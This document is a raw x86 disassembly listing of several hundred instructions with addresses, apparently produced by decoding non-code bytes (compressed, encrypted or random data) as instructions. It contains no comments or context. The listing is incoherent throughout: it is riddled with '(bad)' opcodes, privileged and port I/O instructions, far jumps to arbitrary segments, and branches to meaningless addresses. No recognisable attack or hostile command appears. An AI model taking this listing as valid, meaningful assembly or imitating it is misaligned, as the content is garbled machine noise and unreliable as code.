  421f48:	sbb    BYTE PTR [ebp-0xb2ebb1f],dl
  421f4e:	mov    edx,0x1e21c5e4
  421f53:	jp     0x421fa7
  421f55:	hlt    
  421f56:	jb     0x421fa2
  421f58:	outs   dx,BYTE PTR ds:[esi]
  421f59:	mov    bl,0x90
  421f5b:	mov    ebp,0x120cdee3
  421f60:	imul   ecx,DWORD PTR [edi-0x733fa0ad],0xffffffa7
  421f67:	jl     0x421fd6
  421f69:	retf   0x2846
  421f6c:	add    al,0x25
  421f6e:	xchg   DWORD PTR [esi+0x1e6686ca],ebp
  421f74:	sbb    ah,dh
  421f76:	in     al,dx
  421f77:	sub    BYTE PTR [eax+0x2f81fdc],ch
  421f7d:	and    eax,ebp
  421f7f:	push   edi
  421f80:	mov    al,ds:0xd988c23c
  421f85:	dec    ebp
  421f86:	data16 sub dh,dh
  421f89:	add    DWORD PTR [esi-0x595bf495],ecx
  421f8f:	xor    ah,BYTE PTR ds:0x1bde4281
  421f95:	push   ebx
  421f96:	fisttp DWORD PTR [eax]
  421f98:	int3   
  421f99:	push   ds
  421f9a:	inc    esi
  421f9b:	(bad)  
  421f9c:	pusha  
  421f9d:	arpl   WORD PTR [ecx-0x133294ba],bx
  421fa3:	(bad)  
  421fa4:	nop
  421fa5:	aaa    
  421fa6:	and    al,0x4a
  421fa8:	ret    0x1fe
  421fab:	outs   dx,BYTE PTR ds:[esi]
  421fac:	addr16 inc edi
  421fae:	cmp    BYTE PTR [edx+ebx*2-0x2],dh
  421fb2:	dec    edi
  421fb3:	icebp  
  421fb4:	push   esi
  421fb5:	jo     0x422000
  421fb7:	fldcw  WORD PTR fs:[eax-0x767f74]
  421fbe:	dec    edi
  421fbf:	jmp    0xfd9e:0x85d70904
  421fc6:	jbe    0x421f4e
  421fc8:	or     DWORD PTR [eax+0x5d],esp
  421fcb:	rol    DWORD PTR [eax+0x7e],cl
  421fce:	push   ebp
  421fcf:	mov    cl,0xa8
  421fd1:	jge    0x421f70
  421fd3:	loopne 0x42200c
  421fd5:	fwait
  421fd6:	mov    ds:0xbf4d2595,al
  421fdb:	dec    edi
  421fdc:	out    0x8,al
  421fde:	hlt    
  421fdf:	sub    BYTE PTR [edx],dh
  421fe1:	test   DWORD PTR ds:0x6bc92466,ebp
  421fe7:	xor    al,0xb5
  421fe9:	not    BYTE PTR ds:[ecx]
  421fec:	inc    eax
  421fed:	lods   al,BYTE PTR ds:[si]
  421fef:	sub    al,0xba
  421ff1:	xor    eax,0x278151aa
  421ff6:	adc    BYTE PTR [esi-0x7cb17ba],0xa
  421ffd:	dec    edx
  421ffe:	dec    esp
  421fff:	stos   BYTE PTR es:[edi],al
  422000:	scas   al,BYTE PTR es:[edi]
  422001:	daa    
  422002:	inc    ebp
  422003:	cmp    eax,0x8fc214d0
  422008:	push   esi
  422009:	das    
  42200a:	xor    al,BYTE PTR [ecx]
  42200c:	push   ebx
  42200d:	cmp    DWORD PTR ds:0x57916bbe,ebx
  422013:	test   al,0xc5
  422015:	test   DWORD PTR [bx+si],eax
  422018:	int3   
  422019:	js     0x421fce
  42201b:	sbb    DWORD PTR [edx],esp
  42201d:	icebp  
  42201e:	fisttp QWORD PTR [edi+0x7c]
  422021:	out    dx,al
  422022:	bound  eax,QWORD PTR [edi-0x72aa63d3]
  422028:	stos   BYTE PTR es:[edi],al
  422029:	and    dl,BYTE PTR [edx+0x2c688202]
  42202f:	pop    ss
  422030:	mov    ebx,DWORD PTR [ebp+0x3f90ee66]
  422036:	fisubr DWORD PTR [esi+0x62e6b1d6]
  42203c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42203d:	mov    BYTE PTR [ebx-0x2a344914],bl
  422043:	push   edi
  422044:	inc    esp
  422045:	or     bl,BYTE PTR [esi+0x3d0e5222]
  42204b:	jmp    0xb094:0xd9945459
  422052:	not    DWORD PTR ds:0xf5efc2a1
  422058:	cmp    DWORD PTR [ecx+ebx*1+0x443e6c36],ecx
  42205f:	ja     0x4220d4
  422061:	sti    
  422062:	xor    ah,BYTE PTR [eax+0x16]
  422065:	dec    esp
  422066:	imul   ebx,DWORD PTR [ebp+eiz*8-0x19],0x73
  42206b:	cmp    al,0xe0
  42206d:	sub    eax,edx
  42206f:	adc    eax,0x3bc3b563
  422074:	add    DWORD PTR [ecx],0x12
  422077:	xchg   esi,eax
  422078:	(bad)  
  422079:	mov    eax,0xfeecb0b8
  42207e:	cli    
  42207f:	sti    
  422080:	mov    ebx,0xe396cbdf
  422085:	xor    esi,esi
  422087:	add    eax,0x70899811
  42208c:	jmp    FWORD PTR [eax-0x2d514eb6]
  422092:	cdq    
  422093:	mov    ds:0xb2838a30,eax
  422098:	pop    ds
  422099:	adc    ch,BYTE PTR [ecx+0x16741fca]
  42209f:	xchg   esp,eax
  4220a0:	ins    DWORD PTR es:[edi],dx
  4220a1:	cli    
  4220a2:	xchg   edx,eax
  4220a3:	gs out dx,eax
  4220a5:	or     esp,DWORD PTR [esi+edi*4+0x1d]
  4220a9:	dec    eax
  4220aa:	ins    DWORD PTR es:[edi],dx
  4220ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4220ac:	push   es
  4220ad:	jle    0x42212b
  4220af:	enter  0x9f68,0x1c
  4220b3:	(bad)  
  4220b4:	int    0x97
  4220b6:	push   esp
  4220b7:	idiv   DWORD PTR [ecx-0xc]
  4220ba:	add    al,0x79
  4220bc:	lods   al,BYTE PTR ds:[esi]
  4220bd:	inc    ebp
  4220be:	inc    esi
  4220bf:	jns    0x4220d3
  4220c1:	icebp  
  4220c2:	inc    esi
  4220c3:	or     ch,dl
  4220c5:	pop    ebx
  4220c6:	imul   esi,esi,0x47418fce
  4220cc:	jne    0x42212b
  4220ce:	sub    al,0xd8
  4220d0:	jmp    0x422061
  4220d2:	jp     0x422075
  4220d4:	sub    eax,0x6edca882
  4220d9:	mov    esi,0xff23697c
  4220de:	sub    esp,DWORD PTR [eax+eiz*1+0x2ecc2206]
  4220e5:	xor    eax,0x6e345a88
  4220ea:	push   cs
  4220eb:	adc    al,0x97
  4220ed:	aam    0xeb
  4220ef:	fwait
  4220f0:	or     DWORD PTR [ecx],0x1b9c6b96
  4220f6:	les    eax,FWORD PTR [edi-0x76]
  4220f9:	push   esi
  4220fa:	jecxz  0x4220c5
  4220fc:	sar    BYTE PTR [ecx-0x6b8c148],cl
  422102:	jmp    0x422174
  422104:	xor    eax,0xe3585977
  422109:	push   esp
  42210a:	push   ebx
  42210b:	aam    0xf1
  42210d:	das    
  42210e:	inc    esi
  42210f:	mov    bh,0x3b
  422111:	mov    al,ds:0x4eb56a83
  422116:	ins    DWORD PTR es:[edi],dx
  422117:	dec    eax
  422118:	pop    ebp
  422119:	jmp    0xad1e3bc4
  42211e:	cmp    eax,0x5fdb18d8
  422123:	imul   ebx,DWORD PTR [ecx],0xffffffe7
  422126:	or     eax,0xd6255c96
  42212b:	imul   eax,ebp,0xffffff84
  42212e:	ss xor cl,al
  422131:	xor    eax,0x93da2250
  422136:	les    esp,FWORD PTR [ecx+0x409eac18]
  42213c:	popa   
  42213d:	js     0x422166
  42213f:	add    cl,BYTE PTR [esi+0x29]
  422142:	ret    0x8f93
  422145:	ret    
  422146:	es fstp TBYTE PTR cs:[esi-0x1bf82ccb]
  42214e:	jne    0x422143
  422150:	pop    ebx
  422151:	mov    al,ds:0xb29488ab
  422156:	jno    0x42217d
  422158:	sets   BYTE PTR [edi]
  42215b:	mov    esp,0x68ecd001
  422160:	mov    al,0x2f
  422162:	div    DWORD PTR [edi+0x5007732f]
  422168:	int    0xc3
  42216a:	mov    edx,0x9a55040e
  42216f:	xchg   ecx,eax
  422170:	outs   dx,BYTE PTR ds:[esi]
  422171:	mov    ah,0x4a
  422173:	fucom  st(2)
  422175:	adc    eax,0x111016cb
  42217a:	and    esp,DWORD PTR [esi]
  42217c:	cmp    al,0xc
  42217e:	in     al,0xdd
  422180:	mov    esp,DWORD PTR [ecx-0x57ece61d]
  422186:	mov    ds:0xb08a4849,eax
  42218b:	mov    edi,0x6e9f16ad
  422190:	mov    dl,0x3
  422192:	repnz adc bl,BYTE PTR [eax-0x43]
  422196:	push   ebx
  422197:	addr16 adc edx,eax
  42219a:	jo     0x42218c
  42219c:	sti    
  42219d:	cmp    al,0x1
  42219f:	and    ah,BYTE PTR [ebx+0x66]
  4221a2:	int3   
  4221a3:	jo     0x4221e6
  4221a5:	and    DWORD PTR [esi],eax
  4221a7:	sbb    edi,DWORD PTR [eax+0x1e6decfe]
  4221ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4221ae:	or     esp,DWORD PTR [esi-0x1fa2cbdb]
  4221b4:	in     eax,0xb
  4221b6:	mov    cl,0x91
  4221b8:	loopne 0x4221c6
  4221ba:	mov    ch,0x25
  4221bc:	lahf   
  4221bd:	inc    edi
  4221be:	push   edx
  4221bf:	jmp    0x4394:0xc0e6b855
  4221c6:	sub    al,bh
  4221c8:	push   edx
  4221c9:	jg     0x4221ea
  4221cb:	and    dl,al
  4221cd:	push   esp
  4221ce:	jb     0x4a58d362
  4221d4:	push   0xde93a550
  4221d9:	out    0x1f,al
  4221db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4221dc:	jge    0x4221d2
  4221de:	pop    edi
  4221df:	ror    DWORD PTR [ecx],0xab
  4221e2:	jo     0x42221d
  4221e4:	jne    0x4221c7
  4221e6:	mov    esi,0xa25d433a
  4221eb:	fnstenv [edi]
  4221ed:	ins    DWORD PTR es:[edi],dx
  4221ee:	fs xchg esi,eax
  4221f0:	cmp    DWORD PTR [edi],0xe63d2832
  4221f6:	adc    al,0x4
  4221f8:	sbb    esp,eax
  4221fa:	in     al,dx
  4221fb:	jmp    0x422184
  4221fd:	sbb    eax,0xdd316b10
  422202:	mov    fs,ecx
  422204:	jnp    0x422226
  422206:	int    0xe7
  422208:	push   0xfffffff3
  42220a:	into   
  42220b:	imul   ebx,DWORD PTR [esi-0x2931a7d],0x29
  422212:	jns    0x42223c
  422214:	push   eax
  422215:	adc    al,0xa4
  422217:	fld    TBYTE PTR [esi]
  422219:	or     al,0x75
  42221b:	xchg   edi,eax
  42221c:	xchg   esi,eax
  42221d:	xlat   BYTE PTR ds:[ebx]
  42221e:	ins    DWORD PTR es:[edi],dx
  42221f:	xchg   ecx,eax
  422220:	inc    ebp
  422221:	mov    ds:0x9bfcf5df,eax
  422226:	and    edi,edx
  422228:	fs dec ebx
  42222a:	pop    ecx
  42222b:	sbb    eax,0x8a70e96
  422230:	jae    0x42226f
  422232:	mov    esi,DWORD PTR [esi+ecx*8]
  422235:	(bad)  
  422236:	sbb    al,0x82
  422238:	mov    dh,0x6d
  42223a:	das    
  42223b:	cwde   
  42223c:	clc    
  42223d:	jbe    0x4221ed
  42223f:	retf   0x24e5
  422242:	xchg   ebp,eax
  422243:	dec    esi
  422244:	int3   
  422245:	mov    ch,0x1a
  422247:	frstor [eax]
  422249:	stos   DWORD PTR es:[edi],eax
  42224a:	out    0x48,al
  42224c:	pop    ebp
  42224d:	pop    ecx
  42224e:	jno    0x422251
  422250:	or     dh,BYTE PTR [ebx+edi*1-0x5afd4c74]
  422257:	jae    0x422295
  422259:	dec    ebx
  42225a:	pop    eax
  42225b:	cmp    BYTE PTR [eax],ch
  42225d:	les    eax,FWORD PTR [edi-0x6b693492]
  422263:	stc    
  422264:	inc    ebx
  422265:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422266:	pop    ebx
  422267:	cmp    BYTE PTR [eax-0x3af383b8],al
  42226d:	mov    ah,0xec
  42226f:	pop    esi
  422270:	stc    
  422271:	test   dh,dl
  422273:	sbb    edi,ecx
  422275:	inc    edx
  422276:	fiadd  WORD PTR [esi-0x413f0c1d]
  42227d:	cmp    DWORD PTR [eax],ecx
  42227f:	jo     0x4222cf
  422281:	mov    dl,0xcc
  422283:	pop    ebx
  422284:	xor    al,0xdd
  422286:	aam    0xaf
  422288:	jp     0x422289
  42228a:	fwait
  42228b:	int    0xbc
  42228d:	pop    ss
  42228e:	and    esp,ebx
  422290:	fsub   DWORD PTR [esi-0x4d]
  422293:	lea    ebx,[ebx]
  422295:	and    DWORD PTR [edx],ebx
  422297:	jb     0x422297
  422299:	sub    BYTE PTR [ebx-0x37],dl
  42229c:	mov    edx,0x895e7e49
  4222a1:	call   0x629818c1
  4222a6:	mov    DWORD PTR [eax-0x6580b401],esi
  4222ac:	cmp    edx,esp
  4222ae:	test   al,0xf3
  4222b0:	jge    0x422247
  4222b2:	js     0x422240
  4222b4:	xor    eax,0x5718d55c
  4222b9:	and    ecx,esp
  4222bb:	fcomp  QWORD PTR [esi-0x1c]
  4222be:	(bad)  
  4222bf:	pop    ss
  4222c0:	pop    es
  4222c1:	aam    0xeb
  4222c3:	lock shl edi,cl
  4222c6:	(bad)  
  4222c7:	push   ebx
  4222c8:	aam    0x96
  4222ca:	jnp    0x422255
  4222cc:	aam    0x1f
  4222ce:	cmp    eax,0x36a7b00d
  4222d3:	mov    ebx,ebx
  4222d5:	jnp    0x4222ce
  4222d7:	dec    ecx
  4222d8:	clc    
  4222d9:	pop    ss
  4222da:	jae    0x422280
  4222dc:	adc    bh,bh
  4222de:	jecxz  0x422312
  4222e0:	pop    edx
  4222e1:	sbb    cl,BYTE PTR [eax+0x1e05d419]
  4222e7:	or     BYTE PTR ds:0x492685f8,al
  4222ed:	popf   
  4222ee:	sbb    ebp,DWORD PTR [ebp+0x46b91d15]
  4222f4:	dec    ebp
  4222f5:	sub    ah,BYTE PTR [ecx+0x24feba28]
  4222fb:	dec    edi
  4222fc:	mov    BYTE PTR [esi+0x213706a8],dl
  422302:	fs push ecx
  422304:	jmp    0xcd8d:0x4005380
  42230b:	leave  
  42230c:	ret    0x431c
  42230f:	xlat   BYTE PTR ds:[ebx]
  422310:	lock add al,0xe6
  422313:	sahf   
  422314:	fistp  WORD PTR [ebx+0x5a21359]
  42231a:	in     al,0x2c
  42231c:	retf   0xafc3
  42231f:	ficom  DWORD PTR [eax]
  422321:	out    dx,al
  422322:	loopne 0x42239a
  422324:	in     al,dx
  422325:	fdivrp st(1),st
  422327:	push   DWORD PTR [esi-0x47]
  42232a:	sti    
  42232b:	dec    eax
  42232c:	ins    BYTE PTR es:[edi],dx
  42232d:	add    BYTE PTR [esi+0x4c60bdb2],dh
  422333:	fwait
  422334:	popf   
  422335:	clc    
  422336:	pop    esp
  422337:	(bad)  
  422338:	xchg   ebx,eax
  422339:	cmc    
  42233a:	mov    dl,BYTE PTR [esi+0xc5329bc]
  422340:	rcl    DWORD PTR [ecx],1
  422342:	dec    ebx
  422343:	mov    ch,0xf1
  422345:	xchg   ebp,eax
  422346:	and    BYTE PTR [ebx],al
  422348:	out    dx,eax
  422349:	adc    BYTE PTR [edi+0x285c2497],0x19
  422350:	xchg   esp,eax
  422351:	dec    esi
  422352:	out    0xd5,al
  422354:	push   ebx
  422355:	loop   0x422320
  422357:	jecxz  0x42237d
  422359:	stc    
  42235a:	add    ebp,DWORD PTR [esi+0x14]
  42235d:	pop    edi
  42235e:	pop    esp
  42235f:	pop    ss
  422360:	adc    al,0xe1
  422362:	in     eax,0xf1
  422364:	sub    DWORD PTR [edx+0x25c4570c],0x25ef16d6
  42236e:	outs   dx,DWORD PTR ds:[esi]
  42236f:	mov    edx,0xb86706ea
  422374:	dec    eax
  422375:	pop    ecx
  422376:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422377:	add    ebp,ecx
  422379:	inc    esi
  42237a:	test   DWORD PTR [eax-0x14],eax
  42237d:	jns    0x4223bc
  42237f:	push   ss
  422380:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422381:	(bad)  
  422382:	or     BYTE PTR [ecx+0x68],bl
  422385:	imul   DWORD PTR [ecx+0x35]
  422388:	cmp    al,0xe6
  42238a:	adc    eax,0xd8721f2b
  42238f:	inc    esi
  422390:	test   DWORD PTR [ecx],edi
  422392:	pop    edx
  422393:	or     edi,ebp
  422395:	xchg   edi,eax
  422396:	jo     0x422382
  422398:	mov    esp,0xb6a91fc7
  42239d:	sub    al,0x99
  42239f:	popf   
  4223a0:	jne    0x4223f8
  4223a2:	jmp    0x60d3:0xc0df1d97
  4223a9:	test   al,al
  4223ab:	inc    eax
  4223ac:	push   esi
  4223ad:	ret    
  4223ae:	pop    ebx
  4223af:	int3   
  4223b0:	test   DWORD PTR [ebp-0x77686d30],0x8ad15425
  4223ba:	cmp    ah,ch
  4223bc:	and    eax,0xc96c17c
  4223c1:	and    eax,0x4b036c51
  4223c6:	inc    ecx
  4223c7:	inc    eax
  4223c8:	jno    0x4223ce
  4223ca:	mov    bl,0x4d
  4223cc:	adc    DWORD PTR [esi+ebp*1],ebp
  4223cf:	aam    0xa4
  4223d1:	mov    ah,cl
  4223d3:	pop    esi
  4223d4:	sbb    cl,BYTE PTR [ebx-0x7c9e465d]
  4223da:	mov    esp,0xbbf99486
  4223df:	pusha  
  4223e0:	clc    
  4223e1:	push   esp
  4223e2:	fbld   TBYTE PTR [ebp+0x63]
  4223e5:	outs   dx,DWORD PTR ds:[esi]
  4223e6:	or     ch,BYTE PTR [ebx-0x44234240]
  4223ec:	push   esp
  4223ed:	cmp    BYTE PTR [bx+si-0x8a6],al
  4223f2:	adc    cl,al
  4223f4:	adc    eax,0x7f4415d9
  4223f9:	pop    edi
  4223fa:	pop    ebp
  4223fb:	call   0x484dc5a5
  422400:	retf   
  422401:	dec    esi
  422402:	dec    ecx
  422403:	lock clc 
  422405:	test   DWORD PTR [edi],0xbd515c30
  42240b:	add    eax,0x1cdcb015
  422410:	sub    eax,0x8e71aed8
  422415:	aas    
  422416:	loope  0x42248f
  422418:	nop
  422419:	sub    al,BYTE PTR [eax]
  42241b:	inc    esi
  42241c:	test   al,0xba
  42241e:	scas   eax,DWORD PTR es:[edi]
  42241f:	adc    BYTE PTR [ebx+0x49936690],bh
  422425:	dec    edx
  422426:	sub    eax,0x22e2c1c3
  42242b:	shl    cl,0x94
  42242e:	mov    ds:0xa6e8b4d3,al
  422433:	sti    
  422434:	add    DWORD PTR gs:[edx],ebx
  422437:	int3   
  422438:	gs jno 0x4224b7
  42243b:	adc    DWORD PTR [eax+0x77d381f4],edx
  422441:	add    BYTE PTR [ecx+0x550b8a0b],dh
  422447:	inc    eax
  422448:	push   edx
  422449:	out    0xb7,al
  42244b:	shl    BYTE PTR [ecx],1
  42244d:	outs   dx,DWORD PTR ds:[esi]
  42244e:	in     eax,dx
  42244f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422450:	sub    eax,0xde4682c0
  422455:	mov    ?,edx
  422457:	dec    ebx
  422458:	inc    edi
  422459:	rcr    BYTE PTR ds:0x5312599f,cl
  42245f:	lea    ebx,[edi+0x6e]
  422462:	das    
  422463:	addr16 (bad) 
  422465:	cmp    ah,bl
  422467:	fnstenv [edi-0x5c8ebdd6]
  42246d:	xor    al,0x5a
  42246f:	or     BYTE PTR [ebx+0x28dae89b],dl
  422475:	mov    dh,0x13
  422477:	mov    esi,0x58aae883
  42247c:	sbb    eax,0xc514170e
  422481:	sbb    DWORD PTR [ebp-0x2b262dd9],eax
  422487:	lea    edx,ds:[ebp+0x1c]
  42248b:	cmc    
  42248c:	dec    esi
  42248d:	aad    0x17
  42248f:	inc    ecx
  422490:	mov    edx,0xda3f5c9f
  422495:	push   esi
  422496:	gs inc esp
  422498:	pop    esi
  422499:	test   eax,0x36453f9c
  42249e:	dec    ebx
  42249f:	and    esi,DWORD PTR fs:[ebp+0x1c]
  4224a3:	add    BYTE PTR [ebx+0x39],0x2e
  4224a7:	cmp    BYTE PTR [edx],al
  4224a9:	outs   dx,BYTE PTR ds:[esi]
  4224aa:	push   es
  4224ab:	mov    cl,0xe7
  4224ad:	jno    0x42250d
  4224af:	jge    0x42244b
  4224b1:	xchg   esi,eax
  4224b2:	xchg   esi,eax
  4224b3:	cld    
  4224b4:	addr16 pop edx
  4224b6:	pushf  
  4224b7:	dec    edx
  4224b8:	je     0x422479
  4224ba:	sub    eax,0x456a3bac
  4224bf:	dec    ebx
  4224c0:	mov    edx,0x66423fb6
  4224c5:	xchg   edx,eax
  4224c6:	daa    
  4224c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4224c8:	popf   
  4224c9:	repz sub ch,BYTE PTR [ecx]
  4224cc:	popa   
  4224cd:	outs   dx,BYTE PTR ds:[esi]
  4224ce:	jle    0x4224e0
  4224d0:	mov    eax,ds:0x55c801df
  4224d5:	lock test BYTE PTR [ebp+0x7c479b6c],al
  4224dc:	loopne 0x4224d1
  4224de:	dec    esi
  4224df:	cli    
  4224e0:	arpl   di,sp
  4224e2:	imul   ecx,DWORD PTR [esi+0x189303cc],0x66
  4224e9:	hlt    
  4224ea:	repnz cld 
  4224ec:	rcl    edx,0xf4
  4224ef:	inc    ebp
  4224f0:	xchg   edi,eax
  4224f1:	cld    
  4224f2:	int3   
  4224f3:	pop    ds
  4224f4:	inc    ebx
  4224f5:	out    0xfc,al
  4224f7:	lea    esp,[eax-0x6818e54a]
  4224fd:	xchg   edi,eax
  4224fe:	in     al,dx
  4224ff:	fldcw  WORD PTR [ebp+0xb0440db]
  422505:	in     al,dx
  422506:	mov    ah,0xd9
  422508:	xor    DWORD PTR [ebx+edi*2-0x3686b1ca],esp
  42250f:	cmp    bh,BYTE PTR [eax+eax*8-0x6fae9ec3]
  422516:	pushf  
  422517:	into   
  422518:	rcr    DWORD PTR [esi+esi*4-0x6e599a2f],1
  42251f:	xor    esi,DWORD PTR [ebx-0xf]
  422522:	(bad)  
  422523:	or     al,0xc7
  422525:	popf   
  422526:	xchg   DWORD PTR [esi+0x53a2988b],esi
  42252c:	mov    ds:0xb7ce22ae,al
  422531:	pop    ecx
  422532:	and    al,0x79
  422534:	loop   0x4225a0
  422536:	pop    esp
  422537:	xor    eax,0xacdadb1d
  42253c:	push   ebx
  42253d:	sar    DWORD PTR [ebp-0x7a],0x2e
  422541:	push   edx
  422542:	test   BYTE PTR [edi+edx*2-0x7b],dh
  422546:	push   esi
  422547:	fucomi st,st(0)
  422549:	out    0x74,eax
  42254b:	(bad)  
  42254d:	sbb    al,0xc2
  42254f:	and    eax,DWORD PTR [edi]
  422551:	into   
  422552:	cwde   
  422553:	add    DWORD PTR [esp+edi*8-0x798552d9],ebp
  42255a:	cdq    
  42255b:	inc    ecx
  42255c:	push   ds
  42255d:	xor    BYTE PTR [ebp+0x6e],dl
  422560:	pop    esp
  422561:	pop    eax
  422562:	xchg   esi,ebp
  422564:	sbb    ecx,DWORD PTR [ebx+0x2f]
  422567:	mov    bh,0xdd
  422569:	xchg   ebx,eax
  42256a:	xchg   edi,eax
  42256b:	sbb    edi,ecx
  42256d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42256e:	push   edi
  42256f:	sbb    cl,BYTE PTR [ebp-0x2b]
  422572:	pop    ss
  422573:	and    al,0xfd
  422575:	dec    ebx
  422576:	jmp    0xd48d7c84
  42257b:	mov    al,ds:0xc370589e
  422580:	ins    DWORD PTR es:[edi],dx
  422581:	mov    esp,0xf017da5a
  422586:	sub    edx,DWORD PTR [esi-0x57b20327]
  42258c:	mov    ebp,0x3339da1f
  422591:	mov    ah,0xac
  422593:	das    
  422594:	arpl   si,bp
  422596:	int    0xb6
  422598:	jne    0x422536
  42259a:	mov    ch,0xe5
  42259d:	dec    eax
  42259e:	iret   
  42259f:	pop    ebp
  4225a0:	adc    eax,0x5a0b652c
  4225a5:	xchg   ebp,eax
  4225a6:	aad    0x6d
  4225a8:	nop
  4225a9:	pop    esi
  4225aa:	out    0x56,eax
  4225ac:	imul   edx,DWORD PTR [ebp+ebx*4-0x46f47875],0xb31a34aa
  4225b7:	add    BYTE PTR [ecx],bl
  4225b9:	inc    ecx
  4225ba:	pop    DWORD PTR [edi+ecx*8]
  4225bd:	(bad)  
  4225be:	ins    DWORD PTR es:[edi],dx
  4225bf:	mov    esi,0xe30a6040
  4225c4:	and    ebp,DWORD PTR [eax-0x62]
  4225c7:	in     al,dx
  4225c8:	lods   eax,DWORD PTR ds:[esi]
  4225c9:	mov    esi,0xa42a7a30
  4225ce:	(bad)  
  4225cf:	cmp    al,0xf6
  4225d1:	push   ebx
  4225d2:	sar    BYTE PTR [eax-0x7ee6f3ed],0x4b
  4225d9:	mov    esp,DWORD PTR [ebx]
  4225db:	retf   
  4225dc:	fisub  DWORD PTR [ebx-0x7f285d2b]
  4225e2:	aam    0x64
  4225e4:	(bad)  [ebp+0xf]
  4225e7:	inc    esi
  4225e8:	mov    ds:0xbe80c22d,eax
  4225ed:	xchg   ebp,eax
  4225ee:	out    0xa4,eax
  4225f0:	std    
  4225f1:	or     bh,BYTE PTR [edi+0x76]
  4225f4:	lea    ebx,[ecx+0x350b702a]
  4225fa:	push   cs
  4225fb:	or     DWORD PTR [edi-0x7ba75b67],ebx
  422601:	aad    0x30
  422603:	cmc    
  422604:	test   al,0xab
  422606:	adc    BYTE PTR [eax+0x4f],dl
  422609:	lock movq mm6,QWORD PTR [ecx]
  42260d:	shl    BYTE PTR [edx+0x7e6a965d],cl
  422613:	fistp  QWORD PTR [eax]
  422615:	test   DWORD PTR ds:0xfcfa7da5,edi
  42261b:	out    0x7e,eax
  42261d:	xor    BYTE PTR [eax-0x6],0xa2
  422621:	mov    bh,0x8f
  422623:	and    dl,BYTE PTR [edx]
  422625:	xor    esi,DWORD PTR [ecx]
  422627:	(bad)
  42262a:	sub    ebx,DWORD PTR [edi-0x838b783]
  422630:	and    BYTE PTR [edi],0x60
  422633:	push   ss
  422634:	push   ds
  422635:	dec    edx
  422636:	inc    ecx
  422637:	int    0xde
  422639:	ja     0x422664
  42263b:	xchg   BYTE PTR [eax],ch
  42263d:	sahf   
  42263e:	cdq    
  42263f:	lods   al,BYTE PTR ds:[esi]
  422640:	cmp    eax,0x254e1993
  422645:	add    DWORD PTR ds:0xfa732812,ecx
  42264b:	daa    
  42264c:	dec    eax
  42264d:	lock mov esp,0x920679cd
  422653:	mov    WORD PTR [ebx-0x576e2306],cs
  422659:	(bad)  
  42265a:	sbb    eax,ebp
  42265c:	aas    
  42265d:	wrmsr  
  42265f:	popf   
  422660:	(bad)  
  422661:	push   ds
  422662:	mul    BYTE PTR [ebx-0x3f]
  422665:	lock test DWORD PTR [edx+edi*8-0x1647a824],edx
  42266d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42266e:	inc    edx
  42266f:	repz adc al,0x92
  422672:	and    al,0xa
  422674:	lds    ebx,FWORD PTR [edi]
  422676:	pop    ds
  422677:	pop    es
  422678:	jae    0x42269b
  42267a:	es iret 
  42267c:	pop    ebp
  42267d:	mov    bl,0x4d
  42267f:	iret   
  422680:	inc    edx
  422681:	(bad)  
  422682:	adc    eax,0xe7d71666
  422687:	sbb    BYTE PTR [ebp-0x77],0x90
  42268b:	mov    ebp,0x87018476
  422690:	out    dx,al
  422691:	cmc    
  422692:	adc    BYTE PTR [edx+ebx*8],al
  422695:	out    dx,eax
  422696:	int3   
  422697:	xchg   ebp,eax
  422698:	and    BYTE PTR ds:0xb2d67f95,dh
  42269e:	and    ecx,DWORD PTR [edi]
  4226a0:	loop   0x4226d7
  4226a2:	pop    ebp
  4226a3:	cld    
  4226a4:	add    BYTE PTR [ebx-0xf],dh
  4226a7:	pop    esp
  4226a8:	out    0x5e,al
  4226aa:	cmp    dh,al
  4226ac:	cmp    eax,0x1edd7e78
  4226b1:	xchg   cl,bh
  4226b3:	mov    eax,ds:0xc684a121
  4226b8:	mov    ds:0xdc036fa1,al
  4226bd:	in     al,dx
  4226be:	or     ebp,DWORD PTR [esi]
  4226c0:	and    eax,DWORD PTR [edx]
  4226c2:	call   0x28cdb9e7
  4226c7:	aas    
  4226c8:	outs   dx,DWORD PTR ds:[esi]
  4226c9:	inc    esi
  4226ca:	inc    ebx
  4226cb:	sahf   
  4226cc:	and    edi,DWORD PTR [ecx-0x5716fd0f]
  4226d2:	ret    0x38d9
  4226d5:	push   ebp
  4226d6:	push   0x1321494f
  4226db:	sub    cl,dh
  4226dd:	cmp    DWORD PTR [ecx],0xffffffd5
  4226e0:	mov    eax,ds:0x1e996a6f
  4226e5:	jmp    0x422757
  4226e7:	imul   esi,DWORD PTR [ebp+edx*8-0x14],0x86bb1384
  4226ef:	hlt    
  4226f0:	nop
  4226f1:	ds xchg edi,eax
  4226f3:	mov    edi,0x6eb6050c
  4226f8:	das    
  4226f9:	xchg   esp,eax
  4226fa:	iret   
  4226fb:	mov    cl,0xa3
  4226fd:	jae    0x422725
  4226ff:	sub    ah,ah
  422701:	add    BYTE PTR [esi+0x4f8742e2],dh
  422707:	stos   BYTE PTR es:[edi],al
  422708:	popa   
  422709:	imul   edi,eax,0xffffff91
  42270c:	ds pop es
  42270e:	mov    WORD PTR [edx-0xf],es
  422711:	adc    al,0x49
  422713:	mul    esi
  422715:	lahf   
  422716:	sbb    dl,bh
  422718:	mov    edx,DWORD PTR [ebx+0x44]
  42271b:	out    dx,eax
  42271c:	lahf   
  42271d:	fidivr WORD PTR [ebx]
  42271f:	xchg   cl,ch
  422721:	and    bh,BYTE PTR [ebx]
  422723:	(bad)  
  422724:	dec    ebp
  422725:	add    DWORD PTR [ebp-0x6c764817],eax
  42272b:	pop    eax
  42272c:	jnp    0x4226ce
  42272e:	mov    ds:0x2d068cdc,eax
  422733:	xlat   BYTE PTR ds:[ebx]
  422734:	aam    0xc3
  422736:	sub    DWORD PTR [esp+eax*8+0x34],esi
  42273a:	pop    esi
  42273b:	jmp    0xa55b:0xd083705
  422742:	scas   al,BYTE PTR es:[edi]
  422743:	xchg   edx,eax
  422744:	and    eax,0x2c07e737
